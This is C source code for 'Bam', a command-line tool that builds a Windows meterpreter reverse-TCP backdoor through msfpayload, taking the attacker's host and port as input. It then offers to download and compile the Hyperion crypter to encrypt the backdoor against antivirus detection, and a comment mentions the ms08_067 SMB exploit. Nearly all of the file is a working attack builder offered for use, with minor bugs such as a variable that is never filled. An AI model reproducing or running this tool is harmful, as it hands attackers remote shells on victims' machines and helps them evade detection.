/*

██████╗  █████╗ ███╗   ███╗    
██╔══██╗██╔══██╗████╗ ████║    
██████╔╝███████║██╔████╔██║    
██╔══██╗██╔══██║██║╚██╔╝██║    
██████╔╝██║  ██║██║ ╚═╝ ██║    
╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝   
[+]script name : Bam
[+]Author name : naper
[+]Description : A simple script to creat a backdoor using meterpreter . it can run under Kali linux

*/

#include <stdio.h>
#include <stdlib.h>
#include <stdlib.h>
#include <string.h>
#define couleur(param) printf("\033[$m",param)
void set_color_to(int color){ //mettre la couleur à un nombre 
	switch(color){
		case 34:
			printf("\033[34m",color);
			break;
		case 31:
			printf("\033[31m",color);
			break;
		case 32:
			printf("\033[32m",color);
			break;
		case 33:
			printf("\033[33m",color);
			break;
		case 36:
			printf("\033[36m",color);
			break;
		default:
			printf("\033[0m");
			break;
	}

}
void reintialise_color(){ //remet la couleur par default

	printf("\033[0m");
}
void message_info(char const the_message[]){		//message de chargement
	printf("[");
	set_color_to(34);
	printf("Info");
	reintialise_color();
	printf("] : ");
	printf("%s ...\n",the_message);
}
void write(){
	printf("[");
	set_color_to(33);
	printf("Write");
	reintialise_color();
	printf("] > ");
}
void ok(){//message ok
	printf("[");
	set_color_to(32);
	printf("OK");
	reintialise_color();
	printf("] : ");
}
void message_done(char const the_message[]){	   	//message chargement fait
	ok();
	printf("%s .\n",the_message);
}
void message_error(char const the_message[]){		//messsage d'erreur
	printf("[");
	set_color_to(31);
	printf("ERROR");
	reintialise_color();
	printf("] : ");
	printf("%s .\n",the_message);
}
void show_help(){
	puts("Syntax : ./bam -[X]");
	puts("~~commands for Bam:");
	puts("[+] -start : Starting ");
	puts("------------------------------------------------------");
	printf("                 BAM               \n");
	puts("------------------------------------------------------");
	exit(1);
	return ;
}
void creating_bin(){

	return ;

}
void encrypt_his_shit(const char name_of_bam[]){
	/*

		using Hyperion 

	*/
	//download the archive
	system("wget http://nullsecurity.net/tools/binary/Hyperion-1.0.zip");
	//unzip it
	system("unzip Hyperion-1.0.zip");
	//go to hyperion
	system("cd Hyperion-1.0/");
	//compiling hyperion
	system("wine /root/.wine/drive_c/MinGW/bin/g++.exe ./Src/Crypter/*.cpp -o crypter.exe");
	//encrypt
	system("wine crypter.exe bam.exe encrypted_bam.exe");
	message_done("Backdoor encrypted");

	return ;

}
void start(){
	char host[100];
	char path[100];
	char name[100];
	char long_cmd[200]="msfpayload windows/meterpreter/reverse_tcp LHOST=";
	char port[10];
	char yb;
	message_info("Starting ..");
	//system("msfconsole");
	//system("msf > show exploit");
	//system("use windows/smb/ms08_067_netapi");
	message_info("Host ?");
	write();
	scanf("%s",host);
	message_info("port ?");
	write();
	scanf("%s",port);
	message_info("Path ?");
	write();
	scanf("%s",path);
	message_info("backdoor name?");
	write();
	scanf("%s",path);
	message_info("Creating...");
	/*
	char long_cmd[200] = "msfpayload windows/meterpreter/reverse_tcp LHOST=10.188.70.74 LPORT=444 x > /home/naper/bam.exe";
	*/
	strcat(long_cmd, host);
	strcat(long_cmd, " LPORT=");
	strcat(long_cmd, port);
	strcat(long_cmd, " x > ");
	strcat(long_cmd, path);
	system(long_cmd);
	message_done("backdoor generated");
	message_info("Would you like to creat a .bin file ?(y/n)");
	write();
	scanf(" %c",&yb);
	if (yb == 'y')
		creating_bin();
	message_info("Would you like to encrypt the backdoor ?(y/n)");
	write();
	scanf(" %c",&yb);
	if (yb == 'y')
		encrypt_his_shit(name);
	/*
	exit(1);
	*/
	return ;
}
void arguments(int argc, const char * cmd){
	int cmd_exist = 0;
	switch(argc){
		case 1:
			message_error("Bam needs arguments");
			break;
		case 2:
			if (strcmp(cmd,"--help")==0){
				cmd_exist = 1;
				show_help();
			}
			if (strcmp(cmd,"-start") == 0){
				cmd_exist = 1;
				start();
			}
			if (!cmd_exist){
				message_error("can't find your cmd");
			}
			break;
		default:
			message_error("ERROR");
			break;
	}
	return ;
}

void header(){
	printf("\n");
	set_color_to(36);
	printf("██████╗  █████╗ ███╗   ███╗    \n");
	printf("██████╔╝███████║██╔████╔██║    \n");
	printf("██╔══██╗██╔══██║██║╚██╔╝██║    \n");
	printf("██████╔╝██║  ██║██║ ╚═╝ ██║    \n");
	printf("╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝    \n\n");
	printf("Bam a simple script to creat a backdoor using meterpreter\n");
	reintialise_color();
	puts("-----------------------------------------------------------");
	puts("-----------------------------------------------------------");

	return ;
}
int main(int argc, char ** argv){
	const char * cmd = argv[1];
	header();
	arguments(argc, cmd);
	return 0;
}
